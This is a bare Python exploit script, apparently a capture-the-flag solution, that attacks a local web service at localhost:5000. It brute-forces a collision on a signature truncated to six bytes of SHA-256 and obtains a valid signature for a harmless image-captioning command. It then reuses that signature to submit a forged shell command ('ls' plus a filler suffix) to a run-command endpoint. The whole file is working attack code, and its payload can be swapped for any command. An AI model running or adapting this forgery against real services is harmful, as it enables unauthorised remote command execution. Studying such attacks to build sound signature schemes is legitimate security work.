#!/usr/bin/env python3

import base64
import hashlib
import shlex
import urllib.request

target_command = "ls"


def hash(message):
    return hashlib.sha256(message).digest()[0:6]


def command(text):
    return f"convert -background lightblue -fill blue -pointsize 40 -size 320x -gravity Center {shlex.quote('caption:' + text)} png:-"


seen = {}

for x in range(0x1000000):
    h = hash(command(str(x)).encode())
    seen[h] = x

x = 0
while True:
    command = f"{target_command} ; echo {x} > /dev/null"
    h = hash(command.encode())
    if h in seen:
        break
    x += 1

with urllib.request.urlopen(f"http://localhost:5000/?text={seen[h]}") as f:
    sig = f.read().decode().split('data-signature="')[1].split('"')[0]

data = urllib.parse.urlencode({"command": command, "signature": sig}).encode()
with urllib.request.urlopen("http://localhost:5000/api/run_command", data) as f:
    output = base64.b64decode(f.read().split(b",")[1]).decode()

print(output)
